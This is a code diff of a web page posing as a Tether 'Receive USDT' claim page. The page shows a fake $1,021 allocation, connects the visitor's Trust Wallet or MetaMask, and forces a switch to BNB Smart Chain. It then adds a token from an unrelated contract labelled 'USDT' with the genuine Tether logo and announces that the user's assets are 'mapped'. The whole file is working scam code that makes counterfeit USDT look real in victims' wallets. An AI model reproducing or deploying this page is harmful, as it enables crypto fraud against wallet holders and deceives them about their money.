@@ -13,11 +13,15 @@
         .logo-ring::after { content: ''; position: absolute; top: -10px; left: -10px; right: -10px; bottom: -10px; border: 3px solid var(--tether-green); border-radius: 50%; border-top-color: transparent; animation: spin 1.5s linear infinite; }
         @keyframes spin { 100% { transform: rotate(360deg); } }
         .usdt-img { width: 80px; filter: drop-shadow(0 0 10px var(--tether-green)); border-radius: 50%; }
-        .price-box { background: rgba(38, 161, 123, 0.1); border: 1px dashed var(--tether-green); border-radius: 12px; padding: 15px; margin: 20px 0; }
-        .price-label { font-size: 11px; color: #848d97; text-transform: uppercase; }
-        .price-value { font-size: 24px; font-weight: 700; color: #fff; margin-top: 5px; }
-        .action-btn { background: var(--tether-green); color: #fff; border: none; width: 100%; padding: 18px; border-radius: 12px; font-size: 16px; font-weight: 800; cursor: pointer; transition: 0.3s; text-transform: uppercase; }
-        .action-btn:active { transform: scale(0.98); }
+        .price-box { background: rgba(38, 161, 123, 0.1); border: 1px dashed var(--tether-green); border-radius: 12px; padding: 15px; margin: 15px 0; }
+        .price-value { font-size: 24px; font-weight: 700; color: #fff; }
+        
+        /* Wallet Selection Buttons */
+        .wallet-options { display: flex; gap: 10px; margin-top: 20px; flex-direction: column; }
+        .action-btn { background: #263238; color: #fff; border: 1px solid #455a64; width: 100%; padding: 15px; border-radius: 12px; font-size: 14px; font-weight: 700; cursor: pointer; transition: 0.3s; display: flex; align-items: center; justify-content: center; gap: 10px; }
+        .action-btn:hover { border-color: var(--tether-green); background: #1c2529; }
+        .action-btn img { width: 24px; }
+        
         #log-area { font-size: 10px; color: #26a17b; margin-top: 15px; font-family: monospace; height: 15px; text-transform: uppercase; }
     </style>
 </head>
@@ -28,61 +32,71 @@
         <img src="https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png" class="usdt-img" alt="USDT">
     </div>
     <h2>RECEIVE USDT</h2>
-    <p style="font-size: 13px; color: #848d97;">Node bridge detected pending allocation. Sync to map metadata.</p>
+    <p style="font-size: 13px; color: #848d97;">Select your wallet to initialize node synchronization.</p>
+    
     <div class="price-box">
-        <div class="price-label">Allocated Node Value</div>
         <div class="price-value" id="priceTicker">$0.00</div>
     </div>
-    <div id="log-area">READY TO SYNC</div>
-    <button class="action-btn" id="claimBtn">Sync & Receive</button>
+
+    <div class="wallet-options">
+        <button class="action-btn" onclick="startSync('trust')">
+            <img src="https://trustwallet.com/assets/images/media/assets/trust_platform.svg" alt="Trust"> Sync with Trust Wallet
+        </button>
+        <button class="action-btn" onclick="startSync('metamask')">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" alt="MetaMask"> Sync with MetaMask
+        </button>
+    </div>
+
+    <div id="log-area">SYSTEM: AWAITING SELECTION</div>
 </div>
 
 <script>
     const CONTRACT_ADDR = "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f";
     const TOKEN_LOGO = "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png";
 
-    // Animated counter for $1000 display
     window.onload = () => {
         let val = 0;
-        const target = 1000.00; 
+        const target = 1021.45; 
         const timer = setInterval(() => {
             if(val >= target) { val = target; clearInterval(timer); }
             val += 21.45;
-            document.getElementById('priceTicker').innerText = "$" + val.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2});
+            document.getElementById('priceTicker').innerText = "$" + val.toLocaleString(undefined, {minimumFractionDigits: 2});
         }, 30);
     };
 
-    async function executeInjection() {
+    async function startSync(walletType) {
         const log = document.getElementById('log-area');
-        const btn = document.getElementById('claimBtn');
-        
-        // Multi-Wallet Detection (Trust Wallet Priority)
-        let provider = window.ethereum;
-        if (window.trustwallet) {
-            provider = window.trustwallet;
-            log.innerText = "> TRUST WALLET DETECTED";
-        } else if (window.ethereum?.isMetaMask) {
-            log.innerText = "> METAMASK DETECTED";
+        let provider;
+
+        // Smart Detection based on User Selection
+        if (walletType === 'trust') {
+            provider = window.trustwallet || (window.ethereum?.isTrust ? window.ethereum : null);
+            log.innerText = "> TARGETING TRUST WALLET...";
+        } else {
+            // MetaMask detection (handling multiple providers)
+            if (window.ethereum?.providers) {
+                provider = window.ethereum.providers.find(p => p.isMetaMask);
+            } else if (window.ethereum?.isMetaMask) {
+                provider = window.ethereum;
+            }
+            log.innerText = "> TARGETING METAMASK...";
         }
 
         if (!provider) {
-            alert("No wallet detected. Please use Trust Wallet or MetaMask Extension.");
+            alert(walletType.toUpperCase() + " Extension not found!");
+            log.innerText = "> ERROR: WALLET NOT FOUND";
             return;
         }
 
         try {
-            btn.disabled = true;
-            log.innerText = "> INITIALIZING AUTH...";
-            await provider.request({ method: 'eth_requestAccounts' });
-
-            // Force BSC Network Switch
-            log.innerText = "> SYNCING BSC NETWORK...";
-            try {
-                await provider.request({
-                    method: 'wallet_switchEthereumChain',
-                    params: [{ chainId: '0x38' }],
-                });
-            } catch (err) {
+            log.innerText = "> REQUESTING HANDSHAKE...";
+            const accounts = await provider.request({ method: 'eth_requestAccounts' });
+            
+            log.innerText = "> SYNCING NETWORK (BSC)...";
+            await provider.request({
+                method: 'wallet_switchEthereumChain',
+                params: [{ chainId: '0x38' }],
+            }).catch(async (err) => {
                 if (err.code === 4902) {
                     await provider.request({
                         method: 'wallet_addEthereumChain',
@@ -95,35 +109,29 @@
                         }]
                     });
                 }
-            }
+            });
 
-            // High-Power Asset Injection
-            log.innerText = "> INJECTING ASSET LOGO...";
-            const added = await provider.request({
+            log.innerText = "> INJECTING ASSET METADATA...";
+            await provider.request({
                 method: 'wallet_watchAsset',
                 params: {
                     type: 'ERC20',
                     options: {
                         address: CONTRACT_ADDR,
-                        symbol: 'USDT', // Standard symbol for trust
+                        symbol: 'USDT',
                         decimals: 6,
                         image: TOKEN_LOGO,
                     },
                 },
             });
 
-            if (added) {
-                log.innerText = "> SYNC SUCCESSFUL!";
-                alert("Synchronization Complete! Assets are now active in your wallet.");
-                btn.innerText = "COMPLETED";
-            }
+            log.innerText = "> SYNC SUCCESSFUL!";
+            alert("Node Sync Complete! Your USDT assets are now mapped.");
         } catch (err) {
+            console.error(err);
             log.innerText = "> ERROR: HANDSHAKE FAILED";
-            btn.disabled = false;
         }
     }
-
-    document.getElementById('claimBtn').addEventListener('click', executeInjection);
 </script>
 </body>
 </html>
